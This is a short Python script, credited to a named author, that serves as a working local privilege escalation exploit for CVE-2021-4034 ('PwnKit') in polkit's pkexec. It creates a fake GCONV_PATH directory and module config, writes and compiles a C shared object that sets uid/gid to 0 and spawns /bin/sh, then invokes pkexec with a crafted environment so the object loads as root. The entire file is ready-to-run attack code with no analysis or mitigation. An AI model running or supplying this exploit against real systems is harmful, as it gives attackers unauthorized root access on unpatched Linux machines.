#!/usr/bin/env python3

#  CVE-2021-4034
#  Ravindu Wickramasinghe (@rvizx9)

import os
from ctypes import *
from ctypes.util import find_library

so='''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);setgid(0);seteuid(0);setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
    exit(0);
}
'''

def main():
    os.system("mkdir -p 'GCONV_PATH=.' pwnkit ; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'")
    os.system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules")
    f=open("pwnkit/pwnkit.c","w") ; f.write(so) ;f.close()
    os.system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC")
    envi=[b"pwnkit", b"PATH=GCONV_PATH=.",b"CHARSET=PWNKIT",b"SHELL=pwnkit",None]
    env=(c_char_p * len(envi))() ;env[:]=envi
    libc = CDLL(find_library('c'))
    libc.execve(b'/usr/bin/pkexec',c_char_p(None) ,env)

main()